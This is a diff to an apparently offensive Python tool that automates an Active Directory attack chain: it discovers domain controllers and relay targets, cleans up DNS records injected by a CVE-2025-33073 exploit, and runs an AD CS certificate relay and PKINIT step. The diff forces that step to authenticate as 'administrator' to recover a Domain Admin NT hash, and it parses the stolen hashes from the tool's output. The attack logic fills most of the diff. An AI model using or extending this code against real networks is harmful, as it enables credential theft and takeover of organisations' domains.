@@ -52,7 +52,7 @@ from typing import Optional
 # Configuration
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-VERSION = "4.3.1"
+VERSION = "4.3.2"
 TOOLS_DIR = Path("/opt/tools")
 CVE_DIR = TOOLS_DIR / "CVE-2025-33073"
 
@@ -468,11 +468,17 @@ class AutoDiscovery:
         return False
 
     def _detect_interface(self):
-        if self._skip("iface"):
-            return
+        # If user supplied an iface, validate it exists — fall back to auto if not
+        if self.cfg.iface:
+            if Path(f"/sys/class/net/{self.cfg.iface}").exists():
+                detail(f"Iface: {self.cfg.iface} (user-specified)")
+                return
+            log.warning(f"Iface '{self.cfg.iface}' does not exist — auto-detecting")
+            self.cfg.iface = ""
         try:
             out = subprocess.check_output(
-                ["ip", "route", "show", "default"], text=True, timeout=5
+                ["ip", "route", "show", "default"], text=True, timeout=5,
+                stderr=subprocess.DEVNULL
             )
             for line in out.splitlines():
                 if "default" in line:
@@ -490,7 +496,8 @@ class AutoDiscovery:
             return
         try:
             out = subprocess.check_output(
-                ["ip", "-4", "route", "get", "1.1.1.1"], text=True, timeout=5
+                ["ip", "-4", "route", "get", "1.1.1.1"], text=True, timeout=5,
+                stderr=subprocess.DEVNULL
             )
             m = re.search(r"src (\d+\.\d+\.\d+\.\d+)", out)
             if m:
@@ -502,7 +509,8 @@ class AutoDiscovery:
         if self.cfg.iface:
             try:
                 out = subprocess.check_output(
-                    ["ip", "-4", "addr", "show", self.cfg.iface], text=True, timeout=5
+                    ["ip", "-4", "addr", "show", self.cfg.iface], text=True, timeout=5,
+                    stderr=subprocess.DEVNULL
                 )
                 m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", out)
                 if m:
@@ -517,7 +525,8 @@ class AutoDiscovery:
             return
         try:
             out = subprocess.check_output(
-                ["ip", "route", "show", "default"], text=True, timeout=5
+                ["ip", "route", "show", "default"], text=True, timeout=5,
+                stderr=subprocess.DEVNULL
             )
             m = re.search(r"default via (\d+\.\d+\.\d+\.\d+)", out)
             if m:
@@ -537,7 +546,8 @@ class AutoDiscovery:
         if self.cfg.iface:
             try:
                 out = subprocess.check_output(
-                    ["ip", "-4", "addr", "show", self.cfg.iface], text=True, timeout=5
+                    ["ip", "-4", "addr", "show", self.cfg.iface], text=True, timeout=5,
+                    stderr=subprocess.DEVNULL
                 )
                 m = re.search(r"inet (\d+\.\d+\.\d+\.\d+/\d+)", out)
                 if m:
@@ -641,13 +651,14 @@ class AutoDiscovery:
             try:
                 out = subprocess.check_output(
                     ["dig", "+short", "SRV", f"_ldap._tcp.dc._msdcs.{domain}"],
-                    text=True, timeout=10
+                    text=True, timeout=10, stderr=subprocess.DEVNULL
                 )
                 lines = sorted(out.strip().splitlines())
                 if lines:
                     host = lines[0].split()[-1].rstrip(".")
                     out2 = subprocess.check_output(
-                        ["dig", "+short", "A", host], text=True, timeout=5
+                        ["dig", "+short", "A", host], text=True, timeout=5,
+                        stderr=subprocess.DEVNULL
                     )
                     ip = out2.strip().splitlines()[0] if out2.strip() else ""
                     if ip:
@@ -659,7 +670,8 @@ class AutoDiscovery:
         if tool_exists("dig"):
             try:
                 out = subprocess.check_output(
-                    ["dig", "+short", "A", domain], text=True, timeout=5
+                    ["dig", "+short", "A", domain], text=True, timeout=5,
+                    stderr=subprocess.DEVNULL
                 )
                 ip = out.strip().splitlines()[0] if out.strip() else ""
                 if ip:
@@ -680,7 +692,8 @@ class AutoDiscovery:
         if tool_exists("dig"):
             try:
                 out = subprocess.check_output(
-                    ["dig", "+short", "-x", dc_ip], text=True, timeout=5
+                    ["dig", "+short", "-x", dc_ip], text=True, timeout=5,
+                    stderr=subprocess.DEVNULL
                 )
                 fqdn = out.strip().splitlines()[0].rstrip(".") if out.strip() else ""
                 if fqdn:
@@ -694,7 +707,8 @@ class AutoDiscovery:
                 out = subprocess.check_output(
                     ["nxc", "smb", dc_ip], text=True, timeout=15, stderr=subprocess.DEVNULL
                 )
-                m = re.search(r"name:(\S+)", out, re.IGNORECASE)
+                # nxc prints "(name:HOST) (domain:DOM)" — \S+ would eat the ')'
+                m = re.search(r"name:([^\s)]+)", out, re.IGNORECASE)
                 if m:
                     self._set("dc_fqdn", f"{m.group(1)}.{domain}", "nxc SMB")
                     return
@@ -1257,7 +1271,8 @@ def enumerate_targets(cfg: Config) -> tuple[list[str], list[str]]:
         for dh in deleg_hosts:
             try:
                 out = subprocess.check_output(
-                    ["dig", "+short", "A", f"{dh}.{cfg.domain}"], text=True, timeout=5
+                    ["dig", "+short", "A", f"{dh}.{cfg.domain}"], text=True, timeout=5,
+                    stderr=subprocess.DEVNULL
                 )
                 ip = out.strip().splitlines()[0] if out.strip() else ""
                 if ip in relay_targets:
@@ -1617,16 +1632,8 @@ def cleanup_dns_records(cfg: Config):
         log.warning("Skipping DNS cleanup (--no-cleanup)")
         return
 
-    log.info("🧹 Cleaning up injected DNS records...")
-
-    dnstool = find_tool(
-        "dnstool.py",
-        paths=[CVE_DIR / "dnstool.py", TOOLS_DIR / "krbrelayx" / "dnstool.py"]
-    )
-    if not dnstool:
-        log.warning("dnstool.py not found — cannot auto-cleanup DNS records")
-        return
-
+    # Discover injected records first — no point complaining about a missing
+    # tool when the chain didn't inject anything in the first place
     records = []
     for f in cfg.work_dir.glob("exploit-*.txt"):
         content = f.read_text()
@@ -1634,7 +1641,16 @@ def cleanup_dns_records(cfg: Config):
         records.extend(matches)
 
     if not records:
-        log.warning("No DNS records found in exploit logs to clean up")
+        return  # nothing to clean — stay quiet
+
+    log.info("🧹 Cleaning up injected DNS records...")
+
+    dnstool = find_tool(
+        "dnstool.py",
+        paths=[CVE_DIR / "dnstool.py", TOOLS_DIR / "krbrelayx" / "dnstool.py"]
+    )
+    if not dnstool:
+        log.warning(f"dnstool.py not found — cannot auto-cleanup {len(set(records))} DNS record(s)")
         return
 
     for record in set(records):
@@ -3760,7 +3776,12 @@ def _adcs_relay_esc8(ca_host: str, cfg: Config) -> Optional[str]:
 
 
 def _adcs_auth_pfx(pfx_path: str, cfg: Config) -> bool:
-    """Authenticate with a PFX certificate to obtain NT hash via PKINIT."""
+    """Authenticate with a PFX certificate to obtain NT hash via PKINIT.
+
+    Tries to authenticate as administrator (the cert SAN); on patched DCs
+    (CVE-2022-26923 SID binding) this falls back to whoever the requestor
+    was. The actual recovered identity is parsed from certipy's output.
+    """
     if not tool_exists("certipy"):
         log.warning("certipy not found — cannot authenticate with PFX")
         return False
@@ -3768,8 +3789,10 @@ def _adcs_auth_pfx(pfx_path: str, cfg: Config) -> bool:
     log.info(f"Authenticating with certificate: {pfx_path}")
     auth_output = cfg.work_dir / "adcs-auth.txt"
 
+    # Force username=administrator so PAC lookup targets DA on unpatched DCs
     result = run(
-        ["certipy", "auth", "-pfx", pfx_path, "-dc-ip", cfg.dc_ip],
+        ["certipy", "auth", "-pfx", pfx_path, "-dc-ip", cfg.dc_ip,
+         "-username", "administrator", "-domain", cfg.domain],
         cfg, timeout=120, outfile=auth_output
     )
 
@@ -3777,22 +3800,32 @@ def _adcs_auth_pfx(pfx_path: str, cfg: Config) -> bool:
     if auth_output.exists():
         output += auth_output.read_text()
 
-    # Parse NT hash from certipy auth output
-    hash_match = re.search(r"(?:Got hash|NT[: ]+hash)[:\s]+([a-fA-F0-9]{32})", output, re.IGNORECASE)
-    if hash_match:
-        nt_hash = hash_match.group(1)
+    # Preferred: parse "Got hash for 'USER@DOMAIN': LM:NT" — gives us the real identity
+    m = re.search(
+        r"Got hash for '([^@']+)@[^']*'\s*:\s*[a-fA-F0-9]{32}:([a-fA-F0-9]{32})",
+        output
+    )
+    if m:
+        recovered_user, nt_hash = m.group(1), m.group(2)
+        cfg.username = recovered_user
         cfg.nthash = nt_hash
-        success_box("AD CS: NT hash recovered via certificate authentication!")
-        detail(f"NT hash: {nt_hash}")
-        return True
+        cfg.password = ""
+        is_admin = recovered_user.lower() in ("administrator", "admin")
+        if is_admin:
+            success_box("AD CS: Domain Admin NT hash recovered!")
+        else:
+            ok(f"AD CS: NT hash recovered for {recovered_user} (CVE-2022-26923 SID binding "
+               f"prevented impersonation as administrator)")
+        detail(f"User: {recovered_user}  NT: {nt_hash}")
+        return is_admin  # only signal success if we actually got DA
 
-    # Fallback: check for any hex hash
-    hex_match = re.search(r"[:\s]([a-fA-F0-9]{32})(?:\s|$)", output)
-    if hex_match and result.returncode == 0:
-        nt_hash = hex_match.group(1)
-        cfg.nthash = nt_hash
-        ok(f"AD CS: Possible NT hash recovered: {nt_hash}")
-        return True
+    # Fallback: legacy regex without username context
+    hash_match = re.search(r"(?:NT[: ]+hash)[:\s]+([a-fA-F0-9]{32})", output, re.IGNORECASE)
+    if hash_match:
+        cfg.nthash = hash_match.group(1)
+        log.warning(f"Recovered NT hash {cfg.nthash} but could not determine identity — "
+                    f"assuming current user")
+        return False
 
     log.warning("Failed to recover NT hash from certificate authentication")
     return False
